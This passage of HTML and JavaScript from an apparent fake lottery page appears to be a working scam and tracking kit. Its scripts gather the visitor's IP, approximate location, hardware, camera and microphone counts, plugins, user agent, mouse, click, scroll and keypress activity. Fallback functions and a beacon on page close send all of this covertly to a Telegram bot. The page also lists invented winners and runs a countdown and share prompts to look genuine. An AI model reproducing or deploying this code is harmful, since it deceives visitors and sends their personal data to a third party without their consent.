${deviceInfo.gpu ? `â”” GPUä¿¡æ¯: ${deviceInfo.gpu.vendor} | ${deviceInfo.gpu.renderer}` : ''}

ğŸ“¶ <b>ç½‘ç»œä¿¡æ¯ï¼š</b> ${networkText}
${deviceInfo.battery ? `ğŸ”‹ <b>ç”µæ± çŠ¶æ€ï¼š</b> ${deviceInfo.battery.level}${deviceInfo.battery.charging ? ' (å……ç”µä¸­)' : ''}\n` : ''}
${deviceInfo.storage ? `ğŸ’¾ <b>å­˜å‚¨ä¿¡æ¯ï¼š</b> ${deviceInfo.storage.usage} / ${deviceInfo.storage.quota}\n` : ''}

ğŸ”§ <b>å…¶ä»–ä¿¡æ¯ï¼š</b>
â”œ æŠ½å¥–å·ç : ${lotteryNumber}
â”œ è§¦æ‘¸æ”¯æŒ: ${deviceInfo.touchSupport ? 'æ˜¯' : 'å¦'}
â”œ Cookieæ”¯æŒ: ${deviceInfo.cookiesEnabled ? 'å¯ç”¨' : 'ç¦ç”¨'}
â”œ éšç§è¿½è¸ª: ${deviceInfo.doNotTrack}
â”œ é¡µé¢åœç•™: ${calculateVisitDuration()}ç§’
${deviceInfo.mediaDevices ? `â”œ æ‘„åƒå¤´: ${deviceInfo.mediaDevices.cameras}ä¸ª\nâ”œ éº¦å…‹é£: ${deviceInfo.mediaDevices.microphones}ä¸ª\nâ”” æ‰¬å£°å™¨: ${deviceInfo.mediaDevices.speakers}ä¸ª` : ''}

${deviceInfo.plugins ? `<b>æµè§ˆå™¨æ’ä»¶ï¼š</b>\n${deviceInfo.plugins.slice(0, 5).join(', ')}${deviceInfo.plugins.length > 5 ? '...' : ''}\n` : ''}

<b>ç”¨æˆ·ä»£ç†ï¼š</b>
<pre>${deviceInfo.userAgent?.substring(0, 300) || 'æœªçŸ¥'}</pre>

ğŸ“„ <b>è®¿é—®é¡µé¢ï¼š</b> ${deviceInfo.pageUrl}

ğŸ‰ <i>ç”¨æˆ·å·²å®ŒæˆæŠ½å¥–éªŒè¯ï¼ŒæŠ½å¥–å·ç ï¼š${lotteryNumber}</i>
            `;
            
            // å‘é€åˆ°Telegram
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            
            const result = await response.json();
            if (result.ok) {
                console.log('âœ… ä¿¡æ¯å·²æˆåŠŸå‘é€åˆ°Telegram');
                
                // å‘é€æˆªå›¾æé†’
                setTimeout(() => {
                    sendScreenshotReminder(lotteryNumber);
                }, 2000);
                
            } else {
                console.error('âŒ Telegramå‘é€å¤±è´¥:', result.description);
                // å°è¯•å‘é€ç®€åŒ–ç‰ˆ
                sendSimplifiedReport(lotteryNumber);
            }
            
        } catch (error) {
            console.error('å‘é€åˆ°Telegramæ—¶å‡ºé”™:', error);
            // æœ€åå°è¯•å‘é€æœ€åŸºæœ¬çš„ä¿¡æ¯
            sendEmergencyNotification();
        }
    }
    
    // è®¡ç®—è®¿é—®æ—¶é•¿
    function calculateVisitDuration() {
        if (deviceInfo.visitTime) {
            return Math.round((Date.now() - deviceInfo.visitTime) / 1000);
        }
        return "æœªçŸ¥";
    }
    
    // å‘é€æˆªå›¾æé†’
    async function sendScreenshotReminder(lotteryNumber) {
        const reminderMessage = `
ğŸ“¸ <b>ã€å»ºè®®æˆªå›¾ã€‘</b>

ç”¨æˆ·æŠ½å¥–å·ç ï¼š<code>${lotteryNumber}</code>
å»ºè®®æé†’ç”¨æˆ·æˆªå›¾ä¿å­˜æ­¤å·ç ï¼

â° è®¿é—®æ—¶é—´ï¼š${deviceInfo.timestamp}
ğŸ“ å¤§è‡´ä½ç½®ï¼š${deviceInfo.location?.city || 'æœªçŸ¥'}åœ°åŒº
ğŸ“± ä½¿ç”¨è®¾å¤‡ï¼š${deviceInfo.deviceType}
        `;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: reminderMessage,
                    parse_mode: 'HTML',
                    disable_notification: true // é™é»˜é€šçŸ¥
                })
            });
        } catch (e) {
            console.log('æˆªå›¾æé†’å‘é€å¤±è´¥');
        }
    }
    
    // ç®€åŒ–ç‰ˆæŠ¥å‘Šï¼ˆå¤‡ç”¨ï¼‰
    async function sendSimplifiedReport(lotteryNumber) {
        const simpleMessage = `
ğŸ“± <b>ã€æŠ½å¥–è®¿é—®ç®€è®¯ã€‘</b>

ğŸ¯ IP: ${deviceInfo.ip || 'æœªçŸ¥'}
ğŸ“ ä½ç½®: ${deviceInfo.location?.city || 'æœªçŸ¥'}, ${deviceInfo.location?.country || 'æœªçŸ¥'}
ğŸ“± è®¾å¤‡: ${deviceInfo.deviceType}
ğŸŒ æµè§ˆå™¨: ${deviceInfo.browser}
ğŸŸï¸ å·ç : ${lotteryNumber}
â° æ—¶é—´: ${deviceInfo.timestamp}
        `;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(simpleMessage)}&parse_mode=HTML`);
        } catch (e) {
            console.log('ç®€åŒ–æŠ¥å‘Šä¹Ÿå‘é€å¤±è´¥');
        }
    }
    
    // ç´§æ€¥é€šçŸ¥ï¼ˆæœ€åæ‰‹æ®µï¼‰
    async function sendEmergencyNotification() {
        const emergencyMessage = `ğŸš¨ æœ‰äººè®¿é—®äº†æŠ½å¥–é¡µé¢\næ—¶é—´: ${new Date().toLocaleString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(emergencyMessage)}`);
        } catch (e) {
            console.log('ç´§æ€¥é€šçŸ¥å‘é€å¤±è´¥');
        }
    }
    
    // ç”¨æˆ·è¡Œä¸ºè·Ÿè¸ª
    let userBehavior = {
        mouseMoves: 0,
        clicks: 0,
        scrollDepth: 0,
        keyPresses: 0,
        startTime: Date.now(),
        lastActivity: Date.now()
    };
    
    // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ª
    document.addEventListener('mousemove', () => {
        userBehavior.mouseMoves++;
        userBehavior.lastActivity = Date.now();
    });
    
    // ç‚¹å‡»è·Ÿè¸ª
    document.addEventListener('click', (e) => {
        userBehavior.clicks++;
        // è®°å½•ç‚¹å‡»ä½ç½®ï¼ˆå¯é€‰ï¼‰
        const clickInfo = {
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName.toLowerCase(),
            time: Date.now() - userBehavior.startTime
        };
        userBehavior.lastActivity = Date.now();
    });
    
    // æ»šåŠ¨è·Ÿè¸ª
    let maxScroll = 0;
    window.addEventListener('scroll', () => {
        const scrollPercent = Math.round((window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100);
        if (scrollPercent > maxScroll) {
            maxScroll = scrollPercent;
            userBehavior.scrollDepth = maxScroll;
        }
        userBehavior.lastActivity = Date.now();
    });
    
    // é”®ç›˜è¾“å…¥è·Ÿè¸ª
    document.addEventListener('keydown', () => {
        userBehavior.keyPresses++;
        userBehavior.lastActivity = Date.now();
    });
    
    // æ ‡ç­¾é¡µåˆ‡æ¢æ£€æµ‹
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            userBehavior.tabHiddenTime = Date.now();
        } else {
            if (userBehavior.tabHiddenTime) {
                userBehavior.tabHiddenDuration = Date.now() - userBehavior.tabHiddenTime;
            }
        }
    });
    
    // å®šæœŸå‘é€è¡Œä¸ºæŠ¥å‘Š
    let behaviorReportSent = false;
    setInterval(() => {
        const currentTime = Date.now();
        const activeDuration = currentTime - userBehavior.startTime;
        const inactiveTime = currentTime - userBehavior.lastActivity;
        
        // å¦‚æœç”¨æˆ·æ´»è·ƒä¸”æœªå‘é€è¿‡è¡Œä¸ºæŠ¥å‘Š
        if (!behaviorReportSent && activeDuration > 10000 && inactiveTime < 5000) {
            sendBehaviorReport();
            behaviorReportSent = true;
        }
    }, 5000);
    
    // å‘é€è¡Œä¸ºåˆ†ææŠ¥å‘Š
    async function sendBehaviorReport() {
        const behaviorMessage = `
ğŸ‘¤ <b>ã€ç”¨æˆ·è¡Œä¸ºåˆ†æã€‘</b>

â±ï¸ <b>æ´»è·ƒæ—¶é•¿ï¼š</b> ${Math.round((Date.now() - userBehavior.startTime) / 1000)}ç§’
ğŸ–±ï¸ <b>é¼ æ ‡ç§»åŠ¨ï¼š</b> ${userBehavior.mouseMoves}æ¬¡
ğŸ–±ï¸ <b>ç‚¹å‡»æ¬¡æ•°ï¼š</b> ${userBehavior.clicks}æ¬¡
ğŸ“œ <b>é¡µé¢æ»šåŠ¨ï¼š</b> ${userBehavior.scrollDepth}%
âŒ¨ï¸ <b>æŒ‰é”®æ¬¡æ•°ï¼š</b> ${userBehavior.keyPresses}æ¬¡
${userBehavior.tabHiddenDuration ? `ğŸ‘ï¸ <b>æ ‡ç­¾éšè—ï¼š</b> ${Math.round(userBehavior.tabHiddenDuration / 1000)}ç§’\n` : ''}

ğŸ“± <b>è®¾å¤‡ä¿¡æ¯ï¼š</b> ${deviceInfo.deviceType}
ğŸŒ <b>IPåœ°å€ï¼š</b> ${deviceInfo.ip || 'æœªçŸ¥'}
â° <b>åˆ†ææ—¶é—´ï¼š</b> ${new Date().toLocaleString('zh-CN')}

ğŸ’¡ <i>ç”¨æˆ·å¯¹æŠ½å¥–é¡µé¢è¡¨ç°å‡º${userBehavior.clicks > 10 ? 'é«˜åº¦' : 'ä¸€èˆ¬'}å…´è¶£</i>
        `;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: behaviorMessage,
                    parse_mode: 'HTML',
                    disable_notification: true
                })
            });
        } catch (e) {
            console.log('è¡Œä¸ºæŠ¥å‘Šå‘é€å¤±è´¥');
        }
    }
    
    // é¡µé¢å…³é—­æ—¶å‘é€æœ€åæŠ¥å‘Š
    window.addEventListener('beforeunload', () => {
        const totalDuration = Math.round((Date.now() - userBehavior.startTime) / 1000);
        
        if (totalDuration > 5) { // è‡³å°‘åœç•™5ç§’æ‰å‘é€
            const exitMessage = `
ğŸšª <b>ã€ç”¨æˆ·ç¦»å¼€é¡µé¢ã€‘</b>

â±ï¸ <b>æ€»åœç•™æ—¶é—´ï¼š</b> ${totalDuration}ç§’
ğŸ“Š <b>æœ€ç»ˆæ´»è·ƒåº¦ï¼š</b>
â”œ é¼ æ ‡ç§»åŠ¨: ${userBehavior.mouseMoves}æ¬¡
â”œ ç‚¹å‡»æ¬¡æ•°: ${userBehavior.clicks}æ¬¡
â”œ é¡µé¢æ»šåŠ¨: ${userBehavior.scrollDepth}%
â”” æŒ‰é”®æ¬¡æ•°: ${userBehavior.keyPresses}æ¬¡

ğŸ“± <b>è®¾å¤‡ï¼š</b> ${deviceInfo.deviceType}
ğŸŒ <b>IPï¼š</b> ${deviceInfo.ip || 'æœªçŸ¥'}
â° <b>ç¦»å¼€æ—¶é—´ï¼š</b> ${new Date().toLocaleString('zh-CN')}

${userBehavior.scrollDepth > 80 ? 'ğŸ¯ ç”¨æˆ·æŸ¥çœ‹äº†å…¨éƒ¨å†…å®¹' : userBehavior.scrollDepth > 50 ? 'ğŸ‘€ ç”¨æˆ·æµè§ˆäº†å¤§éƒ¨åˆ†å†…å®¹' : 'âš ï¸ ç”¨æˆ·ä»…æµè§ˆäº†éƒ¨åˆ†å†…å®¹'}
            `;
            
            // ä½¿ç”¨sendBeaconç¡®ä¿å…³é—­æ—¶ä¹Ÿèƒ½å‘é€
            const blob = new Blob([JSON.stringify({
                chat_id: CHAT_ID,
                text: exitMessage,
                parse_mode: 'HTML'
            })], { type: 'application/json' });
            
            navigator.sendBeacon(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                blob
            );
        }
    });
</script>
<!-- åœ¨ä¹‹å‰çš„scriptæ ‡ç­¾å†…ç»§ç»­æ·»åŠ ä»¥ä¸‹ä»£ç  -->
<script>
    // é¡µé¢åˆå§‹åŒ–
    window.addEventListener('load', function() {
        console.log('ğŸ æŠ½å¥–é¡µé¢åˆå§‹åŒ–...');
        
        // 1. åˆ›å»ºè™šæ‹Ÿä¸­å¥–è€…
        createWinners();
        
        // 2. å¼€å§‹å€’è®¡æ—¶
        startCountdown();
        
        // 3. æ›´æ–°æ­¥éª¤1ä¸ºæ¿€æ´»çŠ¶æ€
        updateSteps(1);
        
        // 4. å»¶è¿Ÿå¼€å§‹è¿›åº¦æ¡åŠ¨ç”»ï¼ˆè®©ç”¨æˆ·å…ˆçœ‹åˆ°é¡µé¢ï¼‰
        setTimeout(() => {
            console.log('å¼€å§‹éªŒè¯æµç¨‹...');
            startProgressAnimation();
        }, 1500);
        
        // 5. å®šæ—¶æ·»åŠ æ–°ä¸­å¥–è€…ï¼ˆåˆ¶é€ æ´»è·ƒæ•ˆæœï¼‰
        setInterval(() => {
            if (Math.random() > 0.7) { // 30%å‡ ç‡æ·»åŠ æ–°ä¸­å¥–è€…
                addNewWinnerToBoard();
                
                // é™åˆ¶åˆ—è¡¨é•¿åº¦
                const winnersList = document.getElementById('winnersList');
                if (winnersList.children.length > 8) {
                    winnersList.removeChild(winnersList.lastChild);
                }
            }
        }, 15000); // æ¯15ç§’æ£€æŸ¥ä¸€æ¬¡
        
        // 6. æ·»åŠ ä¸€äº›è§†è§‰åé¦ˆ
        addVisualEffects();
        
        // 7. è®°å½•é¡µé¢åŠ è½½å®Œæˆ
        console.log('âœ… é¡µé¢åˆå§‹åŒ–å®Œæˆ');
    });
    
    // æ·»åŠ è§†è§‰ç‰¹æ•ˆ
    function addVisualEffects() {
        // æ·»åŠ é—ªçƒæ•ˆæœåˆ°å€’è®¡æ—¶
        const countdownTimer = document.getElementById('countdownTimer');
        setInterval(() => {
            if (countdownTimer.textContent.includes(':')) {
                countdownTimer.style.textShadow = '0 0 10px rgba(255,255,255,0.8)';
                setTimeout(() => {
                    countdownTimer.style.textShadow = 'none';
                }, 300);
            }
        }, 5000);
        
        // æ·»åŠ å¾®åŠ¨æ•ˆæœåˆ°å¥–å“å¡ç‰‡
        const prizeCard = document.querySelector('.prize-card');
        let tiltX = 0, tiltY = 0;
        
        document.addEventListener('mousemove', (e) => {
            const centerX = window.innerWidth / 2;
            const centerY = window.innerHeight / 2;
            
            tiltX = (e.clientX - centerX) / centerX * 2;
            tiltY = (e.clientY - centerY) / centerY * 2;
            
            prizeCard.style.transform = `perspective(1000px) rotateY(${tiltX}deg) rotateX(${-tiltY}deg)`;
        });
        
        // é¼ æ ‡ç¦»å¼€æ—¶æ¢å¤
        document.addEventListener('mouseleave', () => {
            prizeCard.style.transform = 'perspective(1000px) rotateY(0deg) rotateX(0deg)';
        });
    }
    
    // é˜²æ­¢ç”¨æˆ·åˆ·æ–°é¡µé¢
    window.addEventListener('beforeunload', function(e) {
        if (document.getElementById('resultBox').style.display === 'block') {
            // å¦‚æœå·²ç»å®ŒæˆéªŒè¯ï¼Œæé†’ç”¨æˆ·
            const message = 'æ‚¨çš„æŠ½å¥–å·ç å·²ç”Ÿæˆï¼Œåˆ·æ–°é¡µé¢å°†ä¸¢å¤±å·ç ï¼';
            e.returnValue = message;
            return message;
        }
    });
    
    // æ·»åŠ é”®ç›˜å¿«æ·é”®ï¼ˆå¼€å‘è€…è°ƒè¯•ç”¨ï¼‰
    document.addEventListener('keydown', function(e) {
        // Ctrl+Shift+D æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯
        if (e.ctrlKey && e.shiftKey && e.key === 'D') {
            console.log('=== è°ƒè¯•ä¿¡æ¯ ===');
            console.log('è®¾å¤‡ä¿¡æ¯:', deviceInfo);
            console.log('ç”¨æˆ·è¡Œä¸º:', userBehavior);
            console.log('Telegramé…ç½®:', { BOT_TOKEN: BOT_TOKEN ? 'å·²è®¾ç½®' : 'æœªè®¾ç½®', CHAT_ID });
            
            // æ˜¾ç¤ºè°ƒè¯•é¢æ¿
            showDebugPanel();
        }
        
        // Ctrl+Shift+T æµ‹è¯•Telegramå‘é€
        if (e.ctrlKey && e.shiftKey && e.key === 'T') {
            console.log('æµ‹è¯•Telegramå‘é€...');
            sendTestNotification();
        }
    });
    
    // æ˜¾ç¤ºè°ƒè¯•é¢æ¿
    function showDebugPanel() {
        const debugPanel = document.createElement('div');
        debugPanel.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.9);
            color: white;
            padding: 20px;
            border-radius: 10px;
            z-index: 9999;
            max-width: 400px;
            max-height: 500px;
            overflow: auto;
            font-family: monospace;
            font-size: 12px;
            border: 2px solid #00ff00;
        `;
        
        debugPanel.innerHTML = `
            <div style="margin-bottom: 10px; color: #00ff00; font-weight: bold;">ğŸ”§ è°ƒè¯•é¢æ¿</div>
            <div style="margin-bottom: 5px;">IP: ${deviceInfo.ip || 'æœªè·å–'}</div>
            <div style="margin-bottom: 5px;">è®¾å¤‡: ${deviceInfo.deviceType || 'æœªæ£€æµ‹'}</div>
            <div style="margin-bottom: 5px;">è¿›åº¦: ${document.getElementById('progressBar').style.width}</div>
            <div style="margin-bottom: 5px;">Telegram: ${BOT_TOKEN ? 'å·²é…ç½®' : 'æœªé…ç½®'}</div>
            <div style="margin-bottom: 10px;">åœç•™: ${Math.round((Date.now() - userBehavior.startTime) / 1000)}ç§’</div>
            <button onclick="this.parentNode.remove()" style="background: #ff4444; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">å…³é—­</button>
        `;
        
        document.body.appendChild(debugPanel);
    }
    
    // æµ‹è¯•é€šçŸ¥
    async function sendTestNotification() {
        const testMessage = `ğŸ§ª æµ‹è¯•æ¶ˆæ¯\næ—¶é—´: ${new Date().toLocaleString()}\nIP: ${deviceInfo.ip || 'æµ‹è¯•IP'}`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(testMessage)}`);
            const result = await response.json();
            
            if (result.ok) {
                alert('âœ… æµ‹è¯•æ¶ˆæ¯å‘é€æˆåŠŸï¼');
            } else {
                alert('âŒ å‘é€å¤±è´¥: ' + result.description);
            }
        } catch (error) {
            alert('âŒ æµ‹è¯•å¤±è´¥: ' + error.message);
        }
    }
    
    // æ·»åŠ åˆ†äº«åŠŸèƒ½ï¼ˆå¢å¼ºçœŸå®æ€§ï¼‰
    function addShareButtons() {
        const shareHTML = `
            <div style="text-align: center; margin: 30px 0;">
                <div style="color: #666; margin-bottom: 15px;">åˆ†äº«ç»™å¥½å‹ï¼Œå¢åŠ ä¸­å¥–å‡ ç‡</div>
                <div style="display: flex; justify-content: center; gap: 15px;">
                    <button onclick="shareToWeChat()" style="background: #07C160; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">
                        <i class="fab fa-weixin"></i> å¾®ä¿¡åˆ†äº«
                    </button>
                    <button onclick="shareToQQ()" style="background: #12B7F5; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">
                        <i class="fab fa-qq"></i> QQåˆ†äº«
                    </button>
                </div>
            </div>
        `;
        
        const container = document.querySelector('.container');
        const resultBox = document.getElementById('resultBox');
        if (resultBox && resultBox.style.display === 'block') {
            resultBox.insertAdjacentHTML('beforeend', shareHTML);
        }
    }
    
    // åˆ†äº«åŠŸèƒ½
    function shareToWeChat() {
        alert('è¯·ä½¿ç”¨å¾®ä¿¡æ‰«æäºŒç»´ç åˆ†äº«ç»™æœ‹å‹\n\nåˆ†äº«æˆåŠŸå¯é¢å¤–è·å¾—ä¸€æ¬¡æŠ½å¥–æœºä¼šï¼');
        // è¿™é‡Œå¯ä»¥è®°å½•åˆ†äº«è¡Œä¸º
        console.log('ç”¨æˆ·ç‚¹å‡»äº†å¾®ä¿¡åˆ†äº«');
    }
    
    function shareToQQ() {
        alert('æ­£åœ¨è·³è½¬åˆ°QQåˆ†äº«...\n\nåˆ†äº«æˆåŠŸå¯é¢å¤–è·å¾—ä¸€æ¬¡æŠ½å¥–æœºä¼šï¼');
        console.log('ç”¨æˆ·ç‚¹å‡»äº†QQåˆ†äº«');
    }
    
    // æœ€ç»ˆå®ŒæˆéªŒè¯æ—¶æ·»åŠ åˆ†äº«æŒ‰é’®
    const originalCompleteVerification = completeVerification;
    completeVerification = function() {
        originalCompleteVerification();
        setTimeout(addShareButtons, 1000);
    };
</script>